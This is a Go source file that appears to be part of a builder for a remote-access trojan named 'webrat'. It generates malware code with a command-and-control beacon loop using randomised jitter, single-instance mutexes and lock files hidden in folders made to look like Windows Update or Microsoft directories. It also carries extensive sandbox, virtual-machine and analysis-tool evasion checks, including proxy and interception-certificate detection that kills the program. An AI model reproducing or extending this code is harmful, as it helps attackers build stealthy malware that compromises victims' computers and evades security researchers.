package buildergen

import (
	"fmt"
	"strings"
)

func templateMisc(cfg Config) string {
	delay := cfg.StartupDelaySeconds
	if delay < 0 {
		delay = 0
	}
	if delay > 10 {
		delay = 10
	}
	buildID := escapeGoString(strings.TrimSpace(cfg.BuildID))

	return strings.TrimSpace(fmt.Sprintf(`
var startupDelaySeconds = %d
var startupDelayOnce sync.Once

func applyStartupDelay() {
	startupDelayOnce.Do(func() {
		delay := startupDelaySeconds
		if delay < 0 {
			delay = 0
		}
		time.Sleep(time.Duration(delay) * time.Second)
	})
}

func getBuildLockPath() string {
	if "%s" == "" {
		return ""
	}
	dir := filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())
	return filepath.Join(dir, fmt.Sprintf("webrat_%%s.lock", "%s"))
}

func ensureSingleRunPerBuild() bool {
	lockPath := getBuildLockPath()
	if lockPath == "" {
		return true
	}

	if _, err := os.Stat(lockPath); err == nil {
		return false
	}

	if err := os.MkdirAll(filepath.Dir(lockPath), 0755); err != nil {
		return false
	}

	f, err := os.OpenFile(lockPath, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return false
	}
	_ = f.Close()
	return true
}

func shouldEnforceBuildLock() bool {
	exePath, err := os.Executable()
	if err != nil {
		return true
	}

	exePathLower := strings.ToLower(filepath.Clean(exePath))

	svcDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())))
	workerDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName())))
	disguiseDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getLocalAppDataEnv()), getMicrosoftDirName(), getDisguiseDir())))

	sep := string(os.PathSeparator)
	if strings.HasPrefix(exePathLower, svcDir+sep) || strings.HasPrefix(exePathLower, workerDir+sep) || strings.HasPrefix(exePathLower, disguiseDir+sep) {
		return false
	}
	return true
}

func loopA() {
	mutex, err := acquireMutex(getMutexName())
	if err != nil {
		return
	}
	defer windows.CloseHandle(mutex)

	rand.Seed(time.Now().UnixNano())

	for {
		connectToServer()
		jitter := 5 + rand.Intn(11)
		time.Sleep(time.Duration(jitter) * time.Second)
	}
}

func acquireMutex(name string) (windows.Handle, error) {
	namePtr, _ := syscall.UTF16PtrFromString(name)
	h, err := windows.CreateMutex(nil, true, namePtr)
	if err != nil {
		if errno, ok := err.(syscall.Errno); !ok || errno != 0 {
			return 0, err
		}
	}
	if windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		if h != 0 {
			_ = windows.CloseHandle(h)
		}
		return 0, fmt.Errorf("already running")
	}
	return h, nil
}

func checkAntiVps() {
	if runtime.GOOS != "windows" {
		return
	}

	for _, p := range getVmProcesses() {
		if checkProcessRunning(p) {
			os.Exit(1)
		}
	}

	for _, p := range getSandboxProcs() {
		if checkProcessRunning(p) {
			os.Exit(1)
		}
	}

	for _, pattern := range getVmFiles() {
		if checkFileExists(pattern) {
			os.Exit(1)
		}
	}

	if runtime.NumCPU() < 2 {
		os.Exit(1)
	}

	checkLowRAM()
	checkSmallDisk()
	checkLowUptime()
	checkSandboxUser()
	checkVMRegistry()
	checkLowScreenRes()
	checkVMMacAddress()
	checkRecentFiles()
}

func checkLowRAM() {
	var memInfo [8 * 8]byte
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	proc := kernel32.NewProc(getGlobalMemoryStatusExName())
	*(*uint32)(unsafe.Pointer(&memInfo[0])) = uint32(len(memInfo))
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&memInfo[0])))
	if ret == 0 {
		return
	}
	totalPhys := *(*uint64)(unsafe.Pointer(&memInfo[8]))
	gb := totalPhys / (1024 * 1024 * 1024)
	if gb < 2 {
		os.Exit(1)
	}
}

func checkSmallDisk() {
	var freeBytesAvail, totalBytes, totalFree uint64
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	proc := kernel32.NewProc(getGetDiskFreeSpaceExWName())
	pathPtr, _ := syscall.UTF16PtrFromString("C:\\")
	ret, _, _ := proc.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(unsafe.Pointer(&freeBytesAvail)),
		uintptr(unsafe.Pointer(&totalBytes)),
		uintptr(unsafe.Pointer(&totalFree)),
	)
	if ret == 0 {
		return
	}
	gb := totalBytes / (1024 * 1024 * 1024)
	if gb < 50 {
		os.Exit(1)
	}
}

func checkLowUptime() {
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	proc := kernel32.NewProc(getGetTickCount64Name())
	ret, _, _ := proc.Call()
	uptimeMs := uint64(ret)
	uptimeMin := uptimeMs / 60000
	if uptimeMin < 10 {
		os.Exit(1)
	}
}

func checkSandboxUser() {
	u, err := user.Current()
	if err != nil {
		return
	}
	name := strings.ToLower(u.Username)
	parts := strings.Split(name, "\\")
	if len(parts) > 1 {
		name = parts[len(parts)-1]
	}
	for _, s := range getSandboxUsers() {
		if name == s {
			os.Exit(1)
		}
	}
	hostname, _ := os.Hostname()
	hostLower := strings.ToLower(hostname)
	for _, s := range getSandboxHosts() {
		if strings.Contains(hostLower, s) && s != "desktop-" {
			os.Exit(1)
		}
	}
}

func checkVMRegistry() {
	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())
	for _, entry := range getVmRegPaths() {
		parts := strings.SplitN(entry, "|", 2)
		if len(parts) != 2 {
			continue
		}
		var root uint32
		switch parts[0] {
		case "0x80000001":
			root = 0x80000001
		case "0x80000002":
			root = 0x80000002
		default:
			continue
		}
		pathPtr, _ := syscall.UTF16PtrFromString(parts[1])
		var hKey syscall.Handle
		ret, _, _ := regOpenKeyEx.Call(
			uintptr(root),
			uintptr(unsafe.Pointer(pathPtr)),
			0,
			uintptr(0x20019),
			uintptr(unsafe.Pointer(&hKey)),
		)
		if ret == 0 {
			regCloseKey.Call(uintptr(hKey))
			os.Exit(1)
		}
	}
}

func checkLowScreenRes() {
	user32 := syscall.NewLazyDLL(getUser32DLL())
	getMetrics := user32.NewProc(getGetSystemMetricsName())
	w, _, _ := getMetrics.Call(0)
	h, _, _ := getMetrics.Call(1)
	if w < 800 || h < 600 {
		os.Exit(1)
	}
}

func checkVMMacAddress() {
	ifaces, err := net.Interfaces()
	if err != nil {
		return
	}
	vmPrefixes := getVmMacPrefixes()
	for _, iface := range ifaces {
		if len(iface.HardwareAddr) == 0 {
			continue
		}
		mac := strings.ToLower(iface.HardwareAddr.String())
		if len(mac) < 8 {
			continue
		}
		prefix := mac[:8]
		for _, vp := range vmPrefixes {
			if prefix == vp {
				os.Exit(1)
			}
		}
	}
}

func checkRecentFiles() {
	recentDir := filepath.Join(os.Getenv(getAppDataEnvName()), "Microsoft", "Windows", "Recent")
	entries, err := os.ReadDir(recentDir)
	if err != nil {
		return
	}
	if len(entries) < 10 {
		os.Exit(1)
	}
}

func checkAntiMitm() {
	if runtime.GOOS != "windows" {
		return
	}

	if hasProxyConfigured() {
		os.Exit(1)
	}

	for _, p := range getMitmProcs() {
		if checkProcessRunning(p) {
			os.Exit(1)
		}
	}

	checkMitmCerts()
}

func hasProxyConfigured() bool {
	for _, key := range []string{"HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"} {
		if v := strings.TrimSpace(os.Getenv(key)); v != "" {
			if _, err := url.Parse(v); err == nil {
				return true
			}
		}
	}

	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regQueryValue := advapi32.NewProc("RegQueryValueExW")
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	keyPath, _ := syscall.UTF16PtrFromString("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
	var hKey syscall.Handle
	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20019), uintptr(unsafe.Pointer(&hKey)))
	if ret != 0 {
		return false
	}
	defer regCloseKey.Call(uintptr(hKey))

	valName, _ := syscall.UTF16PtrFromString("ProxyEnable")
	var valType, valSize uint32
	valSize = 4
	var proxyEnabled uint32
	ret2, _, _ := regQueryValue.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, uintptr(unsafe.Pointer(&valType)), uintptr(unsafe.Pointer(&proxyEnabled)), uintptr(unsafe.Pointer(&valSize)))
	if ret2 == 0 && proxyEnabled != 0 {
		return true
	}

	return false
}

func checkMitmCerts() {
	crypt32 := syscall.NewLazyDLL(getCrypt32DLL())
	certOpenStore := crypt32.NewProc(getCertOpenSystemStoreWName())
	certEnumCerts := crypt32.NewProc(getCertEnumCertsName())
	certGetName := crypt32.NewProc(getCertGetNameStringWName())
	certFreeCert := crypt32.NewProc(getCertFreeCertCtxName())
	certCloseStore := crypt32.NewProc(getCertCloseStoreName())

	storeNamePtr, _ := syscall.UTF16PtrFromString("Root")
	hStore, _, _ := certOpenStore.Call(0, uintptr(unsafe.Pointer(storeNamePtr)))
	if hStore == 0 {
		return
	}
	defer certCloseStore.Call(hStore, 0)

	issuers := getMitmIssuers()
	var certCtx uintptr
	for {
		certCtx, _, _ = certEnumCerts.Call(hStore, certCtx)
		if certCtx == 0 {
			break
		}
		buf := make([]uint16, 512)
		ret, _, _ := certGetName.Call(certCtx, 1, 0, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
		if ret == 0 {
			continue
		}
		name := strings.ToLower(syscall.UTF16ToString(buf))
		for _, iss := range issuers {
			if strings.Contains(name, iss) {
				certFreeCert.Call(certCtx)
				certCloseStore.Call(hStore, 0)
				os.Exit(1)
			}
		}
	}
}

func checkFileExists(pattern string) bool {
	matches, err := filepath.Glob(pattern)
	return err == nil && len(matches) > 0
}

type processEntry32 struct {
	Size            uint32
	CntUsage        uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	CntThreads      uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [260]uint16
}

func checkProcessRunning(processName string) bool {
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	createSnapshot := kernel32.NewProc(getCreateToolhelp32SnapshotName())
	pFirst := kernel32.NewProc(getProcess32FirstWName())
	pNext := kernel32.NewProc(getProcess32NextWName())
	closeHandle := kernel32.NewProc(getCloseHandleName())

	snap, _, _ := createSnapshot.Call(0x00000002, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return false
	}
	defer closeHandle.Call(snap)

	var pe processEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	ret, _, _ := pFirst.Call(snap, uintptr(unsafe.Pointer(&pe)))
	if ret == 0 {
		return false
	}

	target := strings.ToLower(processName)
	for {
		name := strings.ToLower(syscall.UTF16ToString(pe.ExeFile[:]))
		if name == target {
			return true
		}
		pe.Size = uint32(unsafe.Sizeof(pe))
		ret, _, _ = pNext.Call(snap, uintptr(unsafe.Pointer(&pe)))
		if ret == 0 {
			break
		}
	}
	return false
}

func setupLogger() *os.File { return nil }
`, delay, buildID, buildID))
}